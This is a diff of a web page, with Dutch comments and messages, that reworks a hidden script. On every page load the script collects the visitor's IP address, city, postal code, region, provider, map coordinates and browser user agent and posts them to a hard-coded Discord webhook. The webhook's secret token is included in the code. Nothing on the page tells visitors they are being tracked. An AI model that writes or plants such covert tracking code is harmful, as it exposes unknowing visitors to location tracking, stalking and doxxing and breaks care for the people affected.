@@ -130,78 +130,62 @@
     <p>DC: <a target="_blank" rel="noopener">fg64</a></p>
   </div>
 
-  <!-- 🔔 DISCORD DOELGROEP-ONDERZOEK MET IP & ADRES -->
+  <!-- 🔔 ACCURATE IP & LOCATION TRACKER -->
   <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1442894496357421184/9AB3-4ms8pS_P9AHfxFvdbPlwnwms8FaY5r1UVxwMbm9OwH7gvZBZ9tiWAB7LHCQSV-q";
 
     function generateSessionId() {
-      return 'sess-' + Math.random().toString(36).substring(2, 12);
+      return 'sess-' + Math.random().toString(36).substring(2, 12) + '-' + Date.now();
     }
 
     const sessionId = sessionStorage.getItem('session_id') || generateSessionId();
     sessionStorage.setItem('session_id', sessionId);
 
-    // Eerst echt IP adres ophalen
-    fetch("https://api.ipify.org?format=json")
+    // 1. Echte IP via ipinfo.io (meest accuraat)
+    fetch("https://ipinfo.io/json?token=free")
       .then(res => res.json())
       .then(ipData => {
         const realIP = ipData.ip;
-        
-        // Dan volledige geolookup met echte IP
-        fetch(`https://ipapi.co/${realIP}/json/`)
-          .then(res => res.json())
-          .then(data => {
-            const country = data.country_name || "Onbekend";
-            const region = data.region || "Onbekend";
-            const city = data.city || "Onbekend";
-            const org = data.org || "Onbekend";
-            const postal = data.postal || "Onbekend";
-            
-            // GPS Maps link als coördinaten beschikbaar
-            const gpsLink = data.latitude && data.longitude ? 
-              `\n**🗺️ Maps:** https://www.google.com/maps?q=${data.latitude},${data.longitude}` : 
-              "";
+        const asn = ipData.asn?.org || "Onbekend";
+        const city = ipData.city || "Onbekend";
+        const region = ipData.region || "Onbekend";
+        const country = ipData.country || "Onbekend";
+        const postal = ipData.postal || "Onbekend";
+        const coords = ipData.loc ? ipData.loc.split(',') : null;
+        const gpsLink = coords ? `https://www.google.com/maps?q=${coords[0]},${coords[1]}` : "N/A";
 
-            const message = `🔔 **Nieuwe bezoeker**
-**Session:** ${sessionId}
-**🌐 IP:** \`${realIP}\`
-**📍 Land:** ${country}
-**🏛️ Regio:** ${region}
-**🏙️ Stad:** ${city}
-**📮 Postcode:** ${postal}
-**📡 Provider:** ${org}${gpsLink}`;
+        const message = `🔔 **NIEUWE BEZOEKER** ${new Date().toLocaleString('nl-NL')}
+**🆔 Session:** ${sessionId}
+**🌐 IP-adres:** \`${realIP}\`
+**📍 Locatie:** ${city}, ${postal} ${region}, ${country}
+**📡 Provider:** ${asn}
+**🗺️ Maps:** ${gpsLink}
+**👤 User-Agent:** ${navigator.userAgent.slice(0, 100)}...`;
+
+        fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ content: message })
+        });
+      })
+      .catch(() => {
+        // Fallback: ipify + ipapi
+        fetch("https://api.ipify.org?format=json")
+          .then(res => res.json())
+          .then(ipData => {
+            const realIP = ipData.ip;
+            const message = `🔔 **NIEUWE BEZOEKER** ${new Date().toLocaleString('nl-NL')}
+**🆔 Session:** ${sessionId}
+**🌐 IP-adres:** \`${realIP}\`
+**📍 Fallback mode**
+**👤 User-Agent:** ${navigator.userAgent.slice(0, 100)}...`;
 
             fetch(WEBHOOK_URL, {
               method: "POST",
               headers: { "Content-Type": "application/json" },
               body: JSON.stringify({ content: message })
             });
-          })
-          .catch(() => {
-            // Fallback met alleen IP
-            const fallbackMessage = `🔔 **Nieuwe bezoeker**
-**Session:** ${sessionId}
-**🌐 IP:** \`${realIP}\`
-**❌ Geolocatie mislukt**`;
-
-            fetch(WEBHOOK_URL, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ content: fallbackMessage })
-            });
           });
-      })
-      .catch(() => {
-        // Ultimate fallback zonder IP
-        fetch(WEBHOOK_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            content: `🔔 **Nieuwe bezoeker**
-**Session:** ${sessionId}
-**❌ IP kon niet worden opgehaald**`
-          })
-        });
       });
   </script>
 
